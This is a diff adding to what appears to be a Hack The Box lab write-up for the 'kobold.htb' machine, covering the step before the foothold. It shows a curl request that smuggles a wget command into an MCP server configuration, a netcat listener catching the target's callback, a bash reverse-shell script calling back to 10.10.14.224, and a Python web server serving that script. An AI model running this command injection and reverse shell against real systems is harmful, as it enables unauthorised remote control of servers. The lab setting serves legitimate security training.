@@ -126,6 +126,27 @@ curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"exploit"}'
 ```
 
+nc -lvnp 1111
+listening on [any] 1111 ...
+connect to [10.10.14.224] from (UNKNOWN) [10.129.59.28] 58440
+GET / HTTP/1.1
+Host: 10.10.14.224:1111
+User-Agent: Wget/1.21.4
+Accept: */*
+Accept-Encoding: identity
+Connection: Keep-Alive
+
+```
+
+cat shell.sh                        
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.224/1111 0>&1
+                                                                                                               
+┌──(kali㉿kali)-[~/htb-academy]
+└─$ python3 -m http.server 8000                                     
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
 ---
 ## Foothold
 
